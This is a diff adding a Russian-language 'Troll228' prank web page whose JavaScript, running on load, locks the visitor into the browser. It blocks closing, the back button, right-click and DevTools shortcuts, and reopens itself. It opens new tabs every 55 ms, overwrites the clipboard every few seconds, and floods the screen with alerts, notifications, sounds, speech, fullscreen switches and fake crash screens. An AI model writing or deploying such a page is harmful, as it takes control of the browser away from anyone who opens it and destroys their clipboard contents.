@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Troll228 MUHAHAHAH</title>
+    <style>
+        body {
+            background-color: #000;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            color: #00ff00;
+            margin: 0;
+            overflow: hidden;
+            transition: all 0.03s;
+            cursor: url('https://media.giphy.com/media/3o6Zt6KHxJTbNbLDeM/giphy.gif'), auto;
+        }
+        h1 {
+            font-size: 80px;
+            text-shadow: 0 0 20px #ff0000, 0 0 30px #00ff00;
+            animation: glitch 0.08s infinite;
+        }
+        .container {
+            margin-top: 20px;
+        }
+        input, button {
+            padding: 12px;
+            font-size: 20px;
+            border: 4px dashed #ff0000;
+            background-color: #000;
+            color: #00ff00;
+            border-radius: 0;
+            font-family: 'Courier New', monospace;
+            transform: skewX(15deg);
+        }
+        button:hover {
+            transform: scale(1.3) rotate(10deg);
+            background-color: #ff00ff;
+            color: #000;
+        }
+        #result {
+            margin-top: 15px;
+            font-size: 30px;
+            color: #ff0000;
+            text-shadow: 0 0 15px #00ff00;
+            animation: flicker 0.04s infinite;
+        }
+        .chaos {
+            position: absolute;
+            pointer-events: none;
+            animation: spin 0.4s infinite linear, bounce 0.3s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-15px, 15px); }
+            40% { transform: translate(15px, -15px); }
+            60% { transform: translate(-15px, 0); }
+            80% { transform: translate(15px, 15px); }
+            100% { transform: translate(0); }
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes bounce {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(-30px); }
+            100% { transform: translateY(0); }
+        }
+        @keyframes rainbow {
+            0% { color: #ff0000; }
+            25% { color: #00ff00; }
+            50% { color: #0000ff; }
+            75% { color: #ff00ff; }
+            100% { color: #ff0000; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Troll228 MUHAHAHAH</h1>
+        <p>ТЫ В МЕМНОЙ БЕЗДНЕ, НУБ!</p>
+        <input type="text" id="name" placeholder="ИМЯ ИЛИ ЛОХ">
+        <button onclick="generatePassword()">МЕМ_КОД</button>
+        <div id="result"></div>
+        <button id="troll-btn" onclick="startTroll()">ВЫРУБИТЬ (ХАХА, НЕТ)</button>
+    </div>
+
+    <!-- Аудиофайлы с мемами -->
+    <audio id="troll-laugh" src="https://www.myinstants.com/media/sounds/troll-laugh.mp3"></audio>
+    <audio id="nyan-cat" src="https://www.myinstants.com/media/sounds/nyan-cat.mp3"></audio>
+    <audio id="rickroll" src="https://www.myinstants.com/media/sounds/rickroll-short.mp3"></audio>
+    <audio id="doge-bark" src="https://www.myinstants.com/media/sounds/doge-bark.mp3"></audio>
+    <audio id="kekw-laugh" src="https://www.myinstants.com/media/sounds/kekw-laugh.mp3"></audio>
+
+    <script>
+        let chaosStarted = true;
+
+        // Переоткрытие вкладки при попытке закрытия
+        window.addEventListener('beforeunload', (e) => {
+            e.preventDefault();
+            e.returnValue = 'ГЫГЫ, КУДА СОБРАЛСЯ, НУБ?';
+            setTimeout(() => {
+                window.open('http://127.0.0.1:5500/', '_blank');
+            }, 100); // Открывает новую вкладку через 100мс
+            return 'ГЫГЫ, КУДА СОБРАЛСЯ, НУБ?';
+        });
+
+        // Блокировка контекстного меню
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            alert('КЕК, НЕТ ПРАВОЙ КНОПКИ, ЛОХ!');
+            spawnChaosElement('https://media.giphy.com/media/sIIhZliB2McAo/giphy.gif', 400);
+        });
+
+        // Блокировка F12 и Ctrl+Shift+I
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                alert('ГЫГЫ, ДЕВТУЛЗЫ ДЛЯ НУБОВ НЕТ!');
+                document.body.style.transform = `rotate(${Math.random() * 360}deg)`;
+                setTimeout(() => document.body.style.transform = '', 500);
+            }
+            // Блокировка Ctrl+W и Alt+F4
+            if ((e.ctrlKey && e.key === 'w') || (e.altKey && e.key === 'F4')) {
+                e.preventDefault();
+                alert('ХАХА, ВЫЙТИ НЕ ПОЛУЧИТСЯ!');
+                spawnRickroll();
+                window.open('http://127.0.0.1:5500/', '_blank'); // Дополнительное открытие вкладки
+            }
+        });
+
+        // Уведомления с мемами
+        function requestNotificationPermission() {
+            if (Notification.permission !== "granted" && Notification.permission !== "denied") {
+                Notification.requestPermission().then(permission => {
+                    if (permission === "granted") startMemeNotifications();
+                });
+            } else if (Notification.permission === "granted") startMemeNotifications();
+        }
+
+        function startMemeNotifications() {
+            const memeMessages = [
+                "ТЫ ЧЁ, САМЫЙ УМНЫЙ?",
+                "КЕК ЛОЛ АРБИДОЛ",
+                "ГЫГЫ, НУБ ДЕТЕКТЕД",
+                "ТВОЙ ПК - ШАУРМА",
+                "ОЙ ВСЁ, Я ПОД СТОЛОМ",
+                "228 ТЫКВ НА ТВОЕЙ ГОЛОВЕ",
+                "ХАХА, ТЫ В МЕМАХ, БРО",
+                "ЧЕГО БЕРИ БОЛЬШЕ",
+                "ТЫ СЕЙЧАС УПАДЕШЬ СО СТУЛА",
+                "ЛОЛ КТО ЭТО СДЕЛАЛ"
+            ];
+            setInterval(() => {
+                new Notification("Troll228", {
+                    body: memeMessages[Math.floor(Math.random() * memeMessages.length)],
+                    icon: 'https://media.giphy.com/media/sIIhZliB2McAo/giphy.gif'
+                });
+            }, 1500);
+        }
+
+        // Мемные звуки на сайте
+        function playMemeSounds() {
+            const memeSounds = [
+                document.getElementById('troll-laugh'),
+                document.getElementById('nyan-cat'),
+                document.getElementById('rickroll'),
+                document.getElementById('doge-bark'),
+                document.getElementById('kekw-laugh')
+            ];
+            setInterval(() => {
+                const sound = memeSounds[Math.floor(Math.random() * memeSounds.length)];
+                sound.currentTime = 0;
+                sound.play().catch(() => console.log("Звук заблокирован, кликни на страницу!"));
+            }, 3000);
+            setInterval(() => {
+                const extraSound = memeSounds[Math.floor(Math.random() * memeSounds.length)];
+                extraSound.currentTime = 0;
+                extraSound.play().catch(() => {});
+            }, 3500);
+        }
+
+        // Подмена буфера обмена мемами
+        function clipboardMeme() {
+            setInterval(() => {
+                const memeClips = ["ГЫГЫ_", "KEK_", "ЛОЛ_", "ТЫКВА_", "228_"];
+                navigator.clipboard.writeText(memeClips[Math.floor(Math.random() * memeClips.length)] + Math.random().toString(36).substr(2));
+            }, 4000);
+        }
+
+        // Вибрация как в мемах
+        function vibrateMeme() {
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([200, 100, 200, 100, 400]);
+                }, 2000);
+            }
+        }
+
+        // Движение окна
+        function moveWindowChaos() {
+            setInterval(() => {
+                window.moveTo(Math.random() * (screen.width - window.outerWidth), Math.random() * (screen.height - window.outerHeight));
+            }, 500);
+        }
+
+        // Полноэкранный режим с приколами каждые 2 секунды
+        function toggleFullScreenMeme() {
+            setInterval(() => {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen()
+                        .then(() => {
+                            document.body.style.backgroundColor = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+                            spawnChaosElement('https://media.giphy.com/media/26FPJGj72fN0jPjBm/giphy.gif', 600);
+                            setTimeout(() => {
+                                document.exitFullscreen().catch(() => {});
+                            }, 2000);
+                        })
+                        .catch(() => {});
+                }
+            }, 4000);
+        }
+
+        // Захват мыши с приколами
+        function lockPointerMeme() {
+            document.body.addEventListener('click', () => {
+                document.body.requestPointerLock();
+            });
+            setInterval(() => {
+                if (document.pointerLockElement) {
+                    document.exitPointerLock();
+                    spawnChaosElement('https://media.giphy.com/media/RqHkCwjRmnbrE1pXas/giphy.gif', 400);
+                }
+            }, 4000);
+        }
+
+        // Открытие вкладок с мемами каждые 10 секунд
+        function openMemeTabs() {
+            setInterval(() => {
+                const memeUrls = [
+                    "https://www.youtube.com/watch?v=dQw4w9WgXcQ", // Rickroll
+                    "https://www.youtube.com/watch?v=2ZIpFytCSVc", // Harlem Shake
+                    "https://www.youtube.com/watch?v=9bZkp7q19f0", // Gangnam Style
+                    "https://www.youtube.com/watch?v=kffacxfA7G4" // Baby Shark
+                ];
+                const url = memeUrls[Math.floor(Math.random() * memeUrls.length)];
+                const newTab = window.open(url, "_blank");
+                if (!newTab) {
+                    window.location.href = url;
+                }
+            }, 55);
+        }
+
+        // Генерация мемного кода
+        function generatePassword() {
+            const name = document.getElementById('name').value || "НУБ";
+            const memeCodes = [
+                "KEK_228", `${name}_ЛОЛ`, "ГЫГЫ_404", "ТЫКВА_666", "MEME_${name}",
+                "ХАХА_НУБ", "ОЙ_ВСЁ", "ЧЕБУРЕК.exe", "ГЛЮК_ГЫ", "ТРОЛOLO",
+                "ШКЕТ_228", "ЛОХ_ГЫ", "КЕКW", "ТЫ_ЧЕГО", "РЖАКА_3000"
+            ];
+            const randomCode = memeCodes[Math.floor(Math.random() * memeCodes.length)];
+            document.getElementById('result').innerText = `МЕМ_КОД: ${randomCode}`;
+            startMemeChaos();
+            requestNotificationPermission();
+        }
+
+        // Спавн хаотичных элементов (GIF)
+        function spawnChaosElement(src, size) {
+            const img = document.createElement('img');
+            img.src = src;
+            img.className = 'chaos';
+            img.style.width = `${size}px`;
+            img.style.left = Math.random() * (window.innerWidth - size) + 'px';
+            img.style.top = Math.random() * (window.innerHeight - size) + 'px';
+            document.body.appendChild(img);
+            setTimeout(() => img.remove(), 4000);
+        }
+
+        // Спавн эмодзи
+        function spawnRandomEmoji() {
+            setInterval(() => {
+                const emojis = ["😂", "🤓", "😺", "💀", "🍌", "🌮", "👾", "🦄", "🍕", "🤡"];
+                const div = document.createElement('div');
+                div.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+                div.className = 'chaos';
+                div.style.fontSize = `${Math.random() * 120 + 40}px`;
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                document.body.appendChild(div);
+                setTimeout(() => div.remove(), 3000);
+            }, 300);
+        }
+
+        function startTroll() {
+            alert(">:) ТЫ ЧЁ, ДУМАЛ ЭТО ВЫКЛЮЧИТ? ГЫГЫГЫ!");
+            startMemeChaos();
+        }
+
+        // Полный хаос с приколами
+        function startMemeChaos() {
+            infiniteMemeLoop();
+            moveWindowChaos();
+            toggleFullScreenMeme();
+            playMemeSounds();
+            clipboardMeme();
+            vibrateMeme();
+            lockPointerMeme();
+            openMemeTabs();
+            glitchOverload();
+            textSpamMeme();
+            buttonTeleport();
+            windowResizeMadness();
+            absurdScreenFlip();
+            fakeBrowserCrash();
+            speechMeme();
+            spawnRickroll();
+            memeBackgroundSwap();
+            rainbowText();
+            memeExplosion();
+            dancingTitle();
+            spawnRandomEmoji();
+            spawnRandomText();
+            randomColorFlash();
+            fakeMouseTrail();
+            screenShake();
+            randomAlerts();
+            invertColors();
+            spamConsoleLog();
+            trapBackButton();
+            fakeLoadingScreen();
+        }
+
+        // Ловушка для кнопки "назад"
+        function trapBackButton() {
+            window.history.pushState(null, null, window.location.href);
+            setInterval(() => {
+                window.history.pushState(null, null, window.location.href);
+                if (window.history.state) {
+                    alert('ГЫГЫ, НАЗАД НЕ ВЫЙДЕШЬ!');
+                    spawnChaosElement('https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif', 500);
+                    window.open('http://127.0.0.1:5500/', '_blank'); // Открытие при нажатии "назад"
+                }
+            }, 1000);
+        }
+
+        // Фейковая загрузка при попытке уйти
+        function fakeLoadingScreen() {
+            setInterval(() => {
+                if (Math.random() < 0.1) { // 10% шанс каждые 2 секунды
+                    document.body.innerHTML = '<h1 style="color: #ff00ff; font-size: 60px;">ОШИБКА ВЫХОДА<br>ГЫГЫ, ЖДИ 228 СЕКУНД!</h1>';
+                    setTimeout(() => {
+                        location.reload();
+                        window.open('http://127.0.0.1:5500/', '_blank'); // Дополнительное открытие
+                    }, 2000);
+                }
+            }, 2000);
+        }
+
+        function infiniteMemeLoop() {
+            setInterval(() => {
+                const memeOptions = [
+                    'https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif', // Танцующий кот
+                    'https://media.giphy.com/media/sIIhZliB2McAo/giphy.gif', // Троллфейс
+                    'https://media.giphy.com/media/l4pTshfszrFzX6Y3i/giphy.gif', // Шокированный кот
+                    'https://media.giphy.com/media/LXONhtCmN32YU/giphy.gif', // Кек
+                    'https://media.giphy.com/media/3o6Zt6KHxJTbNbLDeM/giphy.gif', // Летающий кот
+                    'https://media.giphy.com/media/26FPJGj72fN0jPjBm/giphy.gif', // Диско-кот
+                    'https://media.giphy.com/media/VOPK1BqsMEBws/giphy.gif', // Доге
+                    'https://media.giphy.com/media/QvBoMEcQ0gP4I/giphy.gif', // Nyan Cat
+                    'https://media.giphy.com/media/vKz4W78O6XuOY/giphy.gif' // Rickroll
+                ];
+                spawnChaosElement(memeOptions[Math.floor(Math.random() * memeOptions.length)], Math.random() * 600 + 200);
+            }, 150);
+        }
+
+        function glitchOverload() {
+            setInterval(() => {
+                document.body.style.filter = `hue-rotate(${Math.random() * 360}deg) blur(${Math.random() * 12}px)`;
+                document.body.style.transform = `rotate(${Math.random() * 25 - 12}deg) scale(${Math.random() * 0.8 + 0.5})`;
+                setTimeout(() => { document.body.style.filter = ''; document.body.style.transform = ''; }, 100);
+            }, 300);
+        }
+
+        function textSpamMeme() {
+            setInterval(() => {
+                const memeTexts = ["ГЫГЫ", "ЛОЛ", "КЕК", "РЖУ", "228", "ТЫКВА", "ЧЕГО", "ХАХА", "ОЙ", "БРЕД"];
+                const div = document.createElement('div');
+                div.innerText = memeTexts[Math.floor(Math.random() * memeTexts.length)];
+                div.className = 'chaos';
+                div.style.fontSize = `${Math.random() * 100 + 30}px`;
+                div.style.color = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                document.body.appendChild(div);
+                setTimeout(() => div.remove(), 3000);
+            }, 200);
+        }
+
+        function buttonTeleport() {
+            setInterval(() => {
+                const buttons = document.querySelectorAll('button');
+                buttons.forEach(btn => {
+                    btn.style.position = 'absolute';
+                    btn.style.left = Math.random() * (window.innerWidth - 100) + 'px';
+                    btn.style.top = Math.random() * (window.innerHeight - 100) + 'px';
+                    btn.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 0.5 + 0.8})`;
+                });
+            }, 600);
+        }
+
+        function windowResizeMadness() {
+            setInterval(() => {
+                window.resizeTo(Math.random() * 1200 + 200, Math.random() * 900 + 200);
+            }, 1500);
+        }
+
+        function absurdScreenFlip() {
+            setInterval(() => {
+                document.body.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 1.5})`;
+                setTimeout(() => document.body.style.transform = '', 300);
+            }, 2000);
+        }
+
+        function fakeBrowserCrash() {
+            setInterval(() => {
+                document.body.innerHTML = '<h1 style="color: #fff; background: #ff00ff; font-size: 90px;">КЕК, КРАШНУЛОСЬ!<br>ГЫГЫГЫ</h1>';
+                setTimeout(() => location.reload(), 800);
+            }, 8000);
+        }
+
+        function speechMeme() {
+            setInterval(() => {
+                const memePhrases = [
+                    "Гы гы гы, нуб!",
+                    "Ты чё, кек?",
+                    "Лол, ты в мемах!",
+                    "Ой всё, ржу как конь!",
+                    "Тыква два два восемь!",
+                    "Ха ха, лох детектед!",
+                    "Чего бери больше!",
+                    "Кек лол, братан!"
+                ];
+                const speech = new SpeechSynthesisUtterance(memePhrases[Math.floor(Math.random() * memePhrases.length)]);
+                speech.pitch = Math.random() * 2;
+                speech.rate = Math.random() * 2 + 0.5;
+                window.speechSynthesis.speak(speech);
+            }, 4000);
+        }
+
+        function spawnRickroll() {
+            setInterval(() => {
+                spawnChaosElement('https://media.giphy.com/media/vKz4W78O6XuOY/giphy.gif', Math.random() * 700 + 300);
+            }, 5000);
+        }
+
+        function memeBackgroundSwap() {
+            const memeBackgrounds = [
+                'https://i.kymcdn.com/photos/images/original/001/096/564/2f7.jpg', // Trollface
+                'https://media.giphy.com/media/3o6Zt6KHxJTbNbLDeM/giphy.gif', // Летающий кот
+                'https://media.giphy.com/media/VOPK1BqsMEBws/giphy.gif', // Доге
+                'https://i.imgur.com/3XjN5fM.jpg', // Доге картинка
+                'https://media.giphy.com/media/QvBoMEcQ0gP4I/giphy.gif' // Nyan Cat
+            ];
+            setInterval(() => {
+                document.body.style.backgroundImage = `url(${memeBackgrounds[Math.floor(Math.random() * memeBackgrounds.length)]})`;
+                document.body.style.backgroundSize = 'cover';
+                setTimeout(() => document.body.style.backgroundImage = '', 2000);
+            }, 4000);
+        }
+
+        function rainbowText() {
+            setInterval(() => {
+                document.querySelectorAll('p, #result').forEach(el => {
+                    el.style.animation = 'rainbow 1s infinite';
+                });
+            }, 1500);
+        }
+
+        function memeExplosion() {
+            setInterval(() => {
+                for (let i = 0; i < 10; i++) {
+                    spawnChaosElement('https://media.giphy.com/media/sIIhZliB2McAo/giphy.gif', Math.random() * 400 + 100);
+                }
+            }, 6000);
+        }
+
+        function dancingTitle() {
+            setInterval(() => {
+                const h1 = document.querySelector('h1');
+                h1.style.transform = `rotate(${Math.random() * 20 - 10}deg) scale(${Math.random() * 0.5 + 0.8})`;
+                h1.style.color = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+                setTimeout(() => h1.style.transform = '', 300);
+            }, 500);
+        }
+
+        // Спавн случайного текста
+        function spawnRandomText() {
+            setInterval(() => {
+                const randomTexts = ["WTF", "OMG", "BRUH", "NOPE", "YEET", "LMAO", "ROFL"];
+                const div = document.createElement('div');
+                div.innerText = randomTexts[Math.floor(Math.random() * randomTexts.length)];
+                div.className = 'chaos';
+                div.style.fontSize = `${Math.random() * 150 + 50}px`;
+                div.style.color = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                document.body.appendChild(div);
+                setTimeout(() => div.remove(), 3000);
+            }, 400);
+        }
+
+        // Вспышки цвета
+        function randomColorFlash() {
+            setInterval(() => {
+                document.body.style.backgroundColor = `#${Math.floor(Math.random()*16777215).toString(16)}`;
+                setTimeout(() => document.body.style.backgroundColor = '#000', 150);
+            }, 2000);
+        }
+
+        // Фальшивый след мыши
+        function fakeMouseTrail() {
+            setInterval(() => {
+                const trail = document.createElement('div');
+                trail.innerText = "🖱️";
+                trail.className = 'chaos';
+                trail.style.fontSize = '40px';
+                trail.style.left = Math.random() * window.innerWidth + 'px';
+                trail.style.top = Math.random() * window.innerHeight + 'px';
+                document.body.appendChild(trail);
+                setTimeout(() => trail.remove(), 2000);
+            }, 500);
+        }
+
+        // Тряска экрана
+        function screenShake() {
+            setInterval(() => {
+                document.body.style.transform = `translate(${Math.random() * 20 - 10}px, ${Math.random() * 20 - 10}px)`;
+                setTimeout(() => document.body.style.transform = '', 200);
+            }, 3000);
+        }
+
+        // Случайные алерты с приколами
+        function randomAlerts() {
+            setInterval(() => {
+                const alertMessages = [
+                    "ТЫ ЧЁ, КЛИКНУЛ? ГЫГЫГЫ!",
+                    "ОШИБКА 228: СЛИШКОМ МНОГО МЕМОВ",
+                    "ТВОЙ ПК СЕЙЧАС ТАНЦУЕТ!",
+                    "ВЫЙТИ НЕЛЬЗЯ, ХАХА!",
+                    "КЕК, ТЫ В ЛОВУШКЕ!"
+                ];
+                alert(alertMessages[Math.floor(Math.random() * alertMessages.length)]);
+            }, 5000);
+        }
+
+        // Инверсия цветов
+        function invertColors() {
+            setInterval(() => {
+                document.body.style.filter = 'invert(100%)';
+                setTimeout(() => document.body.style.filter = '', 500);
+            }, 4000);
+        }
+
+        // Спам в консоль
+        function spamConsoleLog() {
+            setInterval(() => {
+                console.log(`TROLL228: ${Math.random().toString(36).substr(2)} - ГЫГЫГЫ!`);
+            }, 2000);
+        }
+
+        // Старт хаоса сразу
+        startMemeChaos();
+        requestNotificationPermission();
+    </script>
+</body>
+</html>
